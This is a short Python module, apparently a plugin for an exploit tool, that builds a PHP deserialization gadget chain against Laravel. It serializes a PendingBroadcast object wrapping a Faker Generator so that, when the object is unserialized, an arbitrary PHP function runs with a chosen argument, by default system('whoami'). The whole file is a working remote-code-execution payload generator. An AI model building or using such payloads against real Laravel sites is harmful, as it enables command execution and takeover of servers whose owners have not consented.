import hmac
import json
from base64 import b64encode, b64decode

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from phpserialize import *

META = {
    'params': ['func:str', 'param:str'],
    'name': 'laravel1',
    'description': '',
    'version': ('', ''),
}


@namespace('Faker')
class Generator:
    def __init__(self, func):
        self.protected_formatters = {'dispatch': func}


@namespace('Illuminate\\Broadcasting')
class PendingBroadcast:
    def __init__(self, func='system', param='whoami'):
        self.protected_event = param
        self.protected_events = Generator(func)


def construct(app_key, func, param):
    return serialize(PendingBroadcast(func, param))
